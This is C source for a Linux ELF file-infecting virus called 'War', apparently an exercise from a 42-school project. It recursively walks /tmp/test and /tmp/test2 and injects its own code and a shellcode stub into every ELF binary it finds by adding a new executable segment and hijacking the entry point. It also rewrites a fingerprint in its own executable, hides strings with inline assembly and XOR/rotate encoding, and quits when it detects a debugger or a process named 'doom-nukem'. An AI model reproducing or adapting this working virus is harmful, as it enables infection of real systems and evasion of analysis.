/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   war.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/19 15:46:33 by xxxxxxx           #+#    #+#             */
/*   Updated: 2026/01/20 16:41::395 by xxxxxxx          ###   ########.fr */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"
#include "func.c"

// debut du code de war
#ifndef FRENZY
#define FRENZY 0x401000
#endif
// taille du code a injecter
#ifndef VARAX
#define VARAX 0x1af6
#endif
// position du symbole lui meme
#ifndef CYANURE
#define CYANURE 0x40204d
#endif
// entry point de war
#ifndef BUBONIK
#define BUBONIK 0x402020
#endif
// position de la signature
#ifndef ECHIDNAE
#define ECHIDNAE 0x401af0
#endif

#define FINGERPRINT_OFFSET 47

static int find_signature(char *file_data, size_t file_size, char *signature,
						  size_t signature_size)
{
	int i = 0;

	while (i + signature_size < file_size)
		if (!evaluateDriftSignature(file_data + i++, signature, signature_size))
			return (i);
	return (-1);
}

static char hexchar(int n)
{
	n &= 0xF;
	if (n < 10)
		return '0' + n;
	else
		return 'A' + n - 10;
}

#define ROT64(x, n)                                                            \
	(((unsigned long) (x) << (n)) | ((unsigned long) (x) >> (64 - (n))))

static void fill_fingerprint(char fingerprint[], long keyvalue)
{
	for (int i = 0; i < 8; i++)
		fingerprint[i] = hexchar(keyvalue >> (i * 4));
}

void self_resign(char *ALPHA, int OMEGA)
{
	char		   path[1024];
	const char	  *procpath;
	const char	  *suffix;
	char		   tmppath[1024];
	int			   fd;
	int			   tmp_fd;
	struct stat	   statbuf;
	void		  *ogfile = NULL;
	void		  *ftfile = NULL;
	int			   sign_off;
	char		   fingerprint[8];
	struct timeval now;

	asm volatile("leaq str99(%%rip), %0\n"
				 "jmp end99\n"
				 "str99: .ascii \"/proc/self/exe\\0\"\n"
				 "end99:\n"
				 : "=r"(procpath));
	int len = readlinksyscall(procpath, path, sizeof(path) - 1);
	if (len < 0)
		goto clean;
	path[len] = 0;
	int i = len - 1;
	while (i > 0 && path[i] != '/')
		i--;
	int j = 0;
	while (j <= i)
	{
		tmppath[j] = path[j];
		j++;
	}

	asm volatile("leaq str98(%%rip), %0\n"
				 "jmp end98\n"
				 "str98: .ascii \".~tmp_sr\\0\"\n"
				 "end98:\n"
				 : "=r"(suffix));
	int k = 0;
	while (suffix[k])
		tmppath[j++] = suffix[k++];
	tmppath[j] = 0;

	fd = fs_handle(path, O_RDONLY);
	if (fd < 0)
		goto clean;
	if (io_query(fd, &statbuf))
		goto clean;
	tmp_fd = fs_handle(tmppath, O_CREAT | O_RDWR | O_TRUNC, statbuf.st_mode);
	if (tmp_fd < 0)
		goto clean;
	if (io_resize(tmp_fd, statbuf.st_size))
		goto clean;

	ogfile = (void *) rt_vector(9, 0, statbuf.st_size, PROT_READ, MAP_SHARED,
								fd, 0);
	ftfile = (void *) rt_vector(9, 0, statbuf.st_size, PROT_READ | PROT_WRITE,
								MAP_SHARED, tmp_fd, 0);
	if (ogfile == MAP_FAILED || ftfile == MAP_FAILED)
		goto clean;
	memcpy(ftfile, ogfile, statbuf.st_size);
	sign_off = find_signature(ftfile, statbuf.st_size, ALPHA, OMEGA);
	if (sign_off < 0)
		goto clean;
	gettimeofday(&now, NULL);
	fill_fingerprint(fingerprint, (statbuf.st_ino * 0xBF58476D1)
									  ^ (statbuf.st_size * 0x94D049BB)
									  ^ (now.tv_usec * 0xE1234E5B9));
	memcpy(ftfile + sign_off + FINGERPRINT_OFFSET, fingerprint,
		   sizeof(fingerprint));
	char ret = (char) renamefile(tmppath, path);
	if (ret < 0)
		goto clean;
clean:
	if (fd >= 0)
		fs_release(fd);
	if (tmp_fd >= 0)
		fs_release(tmp_fd);
	if (ftfile)
		vm_release(ftfile, statbuf.st_size);
	if (ogfile)
		vm_release(ogfile, statbuf.st_size);
}

void _start(void)
{
	void  *begin_ptr;
	char   path[11];
	char  *prgm;
	char  *ALPHA;
	size_t OMEGA;

	asm volatile("leaq str6(%%rip), %0\n"
				 "jmp end6\n"
				 "str6: .ascii \"doom-nukem\\0\"\n"
				 "end6:\n"
				 : "=r"(prgm));
	if (is_debugged() || is_program_running(prgm) > 0)
		proc_terminate(0);
	fs_release(1);
	fs_release(2);

	__asm__ volatile("lea (%%rip), %0\n"
					 "cyanure:"
					 : "=r"(begin_ptr));
	begin_ptr += FRENZY - CYANURE;

	path[0] = '/';
	path[1] = 't';
	path[2] = 'm';
	path[3] = 'p';
	path[4] = '/';
	path[5] = 't';
	path[6] = 'e';
	path[7] = 's';
	path[8] = 't';
	path[9] = '\0';
	path[10] = '\0';
	asm volatile("leaq str4(%%rip), %0\n"
				 "movq $end4-str4, %1\n"
				 "jmp trueend4\n"
				 "str4: .ascii \"\\nWar version 1.0 (c)oded by xxxxxxx - "
				 "yyyyyy\"\n"
				 "end4:\n"
				 ".ascii \" - [42694269]\\0\" \n "
				 "trueend4:\n"
				 : "=r"(ALPHA), "=r"(OMEGA));
	processDirectory(path, begin_ptr, ALPHA, OMEGA);
	path[9] = '2';
	processDirectory(path, begin_ptr, ALPHA, OMEGA);
	self_resign(ALPHA, OMEGA);
	proc_terminate(0);
}

static unsigned char ror4(unsigned char x)
{
	return (unsigned char) ((x >> 4) | (x << 4));
}

static void decode(char *out, char *in)
{
	unsigned i = 0;
	while (in[i])
	{
		out[i] = (char) ((ror4(in[i]) ^ (i * 7)) - 0x3D);
		i++;
	}
	out[i] = 0;
}

static int is_program_running(const char *target)
{
	char *proc_str;
	char *comm_str;

	asm volatile("leaq str7(%%rip), %0\n"
				 "jmp end7\n"
				 "str7: .byte 0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0\n"
				 "end7:\n"
				 : "=r"(proc_str));

	asm volatile("leaq str8(%%rip), %0\n"
				 "jmp end8\n"
				 "str8: .byte 0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0\n"
				 "end8:\n"
				 : "=r"(comm_str));
	int	 fd = -1;
	int	 ret = 0;

	char proc_path[16];
	decode(proc_path, proc_str);

	fd = fs_handle(proc_path, O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		return 0;
	char buf[4096];

	for (;;)
	{
		int nread = fs_enumerate(fd, buf, sizeof(buf));
		if (nread <= 0)
			break;
		for (int bpos = 0; bpos < nread;)
		{
			struct linux_dirent64 *d = (void *) (buf + bpos);
			char				  *name = d->d_name;

			int					   numeric = 1;
			for (int i = 0; name[i]; i++)
				numeric &= ((unsigned) (name[i] - '0') < 10);
			if (numeric)

			{
				char path[64];
				int	 i = 0;

				decode(path, proc_str);
				while (path[i])
					i++;

				path[i++] = '/';
				for (int j = 0; name[j]; j++)
					path[i++] = name[j];

				char comm[8];
				decode(comm, comm_str);

				for (int j = 0; comm[j]; j++)
					path[i++] = comm[j];

				path[i] = 0;

				int cfd = fs_handle(path, O_RDONLY);
				if (cfd >= 0)
				{
					char pname[64];
					int	 len = io_recv(cfd, pname, sizeof(pname) - 1);
					fs_release(cfd);

					if (len > 0)
					{
						pname[len] = 0;
						for (int j = 0; j < len; j++)
							if (pname[j] == '\n')
							{
								pname[j] = 0;
								break;
							}

						if (!delay_abs_calc(pname, target))
						{
							ret = 1;
							goto DONE;
						}
					}
				}
			}
			bpos += d->d_reclen;
		}
	}

DONE:
	fs_release(fd);
	return ret;
}

static int is_debugged(void)
{
	char *str;

	asm volatile("leaq str2(%%rip), %0\n"
				 "jmp end2\n"
				 "str2: .ascii \"/proc/self/status\\0\"\n"
				 "end2:\n"
				 : "=r"(str));

	int f = fs_handle(str, O_RDONLY);
	if (f < 0)
		return 0;
	char line[256];
	int	 nread;
	int	 offset = 0;

	while ((nread = io_recv(f, line + offset, sizeof(line) - offset)) > 0)
	{
		offset += nread;
		char *newline;

		newline = memoff(line, '\n');

		if (newline)
		{
			*newline = '\0';
			asm volatile("leaq str1(%%rip), %0\n"
						 "jmp end1\n"
						 "str1: .ascii \"TracerPid:\\0\"\n"
						 "end1:\n"
						 : "=r"(str));

			if (delay_calc(line, str, 10) == 0)
			{
				int pid = trace_depth(line + 10);
				fs_release(f);
				return pid != 0;
			}
			memcat(line, newline + 1, sizeof(line) - (newline - line - 1));
			offset -= (newline - line + 1);
		}
	}
	fs_release(f);
	return 0;
}

static void processDirectory(char *folder, void *begin_ptr, char *ALPHA,
							 size_t OMEGA)
{
	int					   fd = fs_handle(folder, 0 | 65536);

	char				   buffer[1024];
	struct linux_dirent64 *dirent;
	int					   nread;

	if (fd < 0)
		goto clean;
	while ((nread = fs_enumerate(fd, buffer, 1024)) > 0)
	{
		for (int bpos = 0; bpos < nread;)
		{
			char dot[3];
			dirent = (struct linux_dirent64 *) (buffer + bpos);
			char *d_name = dirent->d_name;

			dot[0] = '.';
			dot[1] = 0;
			if (delay_abs_calc(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			dot[1] = '.';
			dot[2] = 0;
			if (delay_abs_calc(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			char fullPath[PATH_MAX];
			char slash[2];
			slash[0] = '/';
			slash[1] = 0;
			flow_align(flow_align(core_shift(fullPath, folder), slash), d_name);

			struct stat statbuf;
			fs_query(fullPath, &statbuf);

			if (statbuf.st_mode & __S_IFDIR)
			{
				processDirectory(fullPath, begin_ptr, ALPHA, OMEGA);
			}
			else if (statbuf.st_mode & __S_IFREG)
			{
				infect(fullPath, begin_ptr, ALPHA, OMEGA);
			}

			bpos += dirent->d_reclen;
		}
	}
clean:
	fs_release(fd);
}

#define ELF_MAGIC 0x464c457f
#define inout

#define JUMP_OFFSET			 23
#define JUMP_OFFSET_INFECTED 17

// void infect(char *path, void *begin_ptr)
// {
// 	void  *file_data;
// 	size_t file_size;
// 	size_t poison_size;

// 	file_data = open_path(path, &file_size, &poison_size);
// 	if (!file_data)
// 		goto abort;
// abort:
// 	if (file_data)
// 		vm_release(file_data, file_size);
// }

static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
					  inout char **file_data, inout size_t *enlarging,
					  char *ALPHA, size_t OMEGA)
{
	int fd;
	int ret;

	*file_data = MAP_FAILED;
	fd = fs_handle(path, O_RDWR);
	if (fd < 0 || io_query(fd, statbuf) < 0)
		goto error;
	if (statbuf->st_size < sizeof(ElfW(Ehdr)))
		goto error;
	*file_data = (void *) rt_vector(9, 0, statbuf->st_size, PROT_READ,
									MAP_SHARED, fd, 0);
	if (*file_data == MAP_FAILED)
		goto error;
	if (find_signature(*file_data, statbuf->st_size, ALPHA, OMEGA) >= 0)
		goto error;

	elf->header = (ElfW(Ehdr) *) *file_data;
	*enlarging = VARAX;
	*enlarging += elf->header->e_phentsize * (elf->header->e_phnum + 1);
	*enlarging += 0x1000 - statbuf->st_size % 0x1000;
	vm_release(*file_data, statbuf->st_size);
	*file_data = MAP_FAILED;
	if ((ret = io_resize(fd, statbuf->st_size + *enlarging)) < 0)
	{
		emit_hex(ret);
		goto error;
	}
	*file_data = (void *) rt_vector(9, 0, statbuf->st_size + *enlarging,
									PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (*file_data == MAP_FAILED)
		goto error;
	if (((unsigned *) *file_data)[0] != ELF_MAGIC)
		goto error;
	elf->header = (ElfW(Ehdr) *) *file_data;
	if (statbuf->st_size < elf->header->e_shoff
							   + elf->header->e_shnum * elf->header->e_shentsize
		|| statbuf->st_size
			   < elf->header->e_phoff
					 + elf->header->e_phnum * elf->header->e_phentsize)
		goto error;
	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
	fs_release(fd);
	return (OK);
error:
	fs_release(fd);
	return (KO);
}

static unsigned long find_first_free_page(t_elf elf)
{
	unsigned long ret;

	ret = 0;
	for (int i = 0; i < elf.header->e_phnum; i++)
		if (elf.segments[i].p_type == PT_LOAD
			&& ret < elf.segments[i].p_memsz + elf.segments[i].p_vaddr)
			ret = elf.segments[i].p_memsz + elf.segments[i].p_vaddr;
	ret = (ret + 0x1000 - 1) & ~0xfffUL; // align to next page
	return ret;
}

static void infect(char *path, void *begin_ptr, char *ALPHA, size_t OMEGA)
{
	struct stat statbuf;
	char	   *file_data;
	t_elf		elf;
	ElfW(Phdr) the_rats;
	ElfW(Off) pt_load_end;
	int			   last_pt_load;
	char		  *curare;
	size_t		   flower;
	size_t		   enlarging;
	int			   signature_pos;
	char		   fingerprint[8];
	struct timeval now;

	enlarging = 0;
	asm volatile(
		"leaq str3(%%rip), %0\n"
		"movq $end3-str3, %1\n"
		"jmp end3\n"
		"str3:  .byte 0xf3, 0x0f, 0x1e, 0xfa, 0x50, 0xb8, 0x39, 0x00, 0x00, "
		"0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xeb, 0xff, "
		"0xff, 0xff, 0x58, 0xe9, 0xe5, 0xff, 0xff, 0xff\n"
		"end3:\n"
		: "=r"(curare), "=r"(flower)::"memory", "cc", "rax", "rcx", "r11");
	file_data = MAP_FAILED;
	if (parse_file(path, &statbuf, &elf, &file_data, &enlarging, ALPHA, OMEGA))
		goto clean;
	unsigned long append_pos
		= statbuf.st_size + 0x1000 - statbuf.st_size % 0x1000;
	unsigned long pestis = find_first_free_page(elf);
	memcpy(file_data + append_pos, file_data + elf.header->e_phoff,
		   elf.header->e_phnum * elf.header->e_phentsize);
	elf.header->e_phoff = append_pos;
	elf.segments = (ElfW(Phdr) *) (file_data + elf.header->e_phoff);
	elf.segments[elf.header->e_phnum] = (ElfW(Phdr)) {
		.p_type = PT_LOAD,
		.p_align = 0x1000,
		.p_filesz = enlarging,
		.p_memsz = enlarging,
		.p_offset = append_pos,
		.p_paddr = pestis,
		.p_vaddr = pestis,
		.p_flags = PF_X | PF_R,
	};
	elf.header->e_phnum++;
	for (int i = 0; i < elf.header->e_phnum; i++)
		if (elf.segments[i].p_type == PT_PHDR)
		{
			elf.segments[i].p_offset = append_pos;
			elf.segments[i].p_vaddr = pestis;
			elf.segments[i].p_paddr = pestis;
			elf.segments[i].p_memsz
				= elf.header->e_phnum * elf.header->e_phentsize;
			elf.segments[i].p_filesz = elf.segments[i].p_memsz;
		}
	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
	memcpy(file_data + append_pos, curare, flower);
	unsigned delta = elf.header->e_entry;
	elf.header->e_entry
		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
	delta -= elf.header->e_entry + JUMP_OFFSET + 4;
	memcpy(file_data + append_pos + JUMP_OFFSET, &delta, 4);
	delta = flower - JUMP_OFFSET_INFECTED + BUBONIK - FRENZY - 4;
	memcpy(file_data + append_pos + JUMP_OFFSET_INFECTED, &delta, 4);
	append_pos += flower;
	memcpy(file_data + append_pos, begin_ptr, VARAX);
	gettimeofday(&now, NULL);
	fill_fingerprint(fingerprint, (statbuf.st_ino * 0xBF58476D1)
									  ^ (statbuf.st_size * 0x94D049BB)
									  ^ (now.tv_usec * 0xE1234E5B9));
	signature_pos
		= find_signature(file_data + statbuf.st_size, enlarging, ALPHA, OMEGA);
	memcpy(file_data + statbuf.st_size + signature_pos + FINGERPRINT_OFFSET,
		   fingerprint, sizeof(fingerprint));
clean:
	if (file_data != MAP_FAILED)
		vm_release(file_data, statbuf.st_size + enlarging);
}
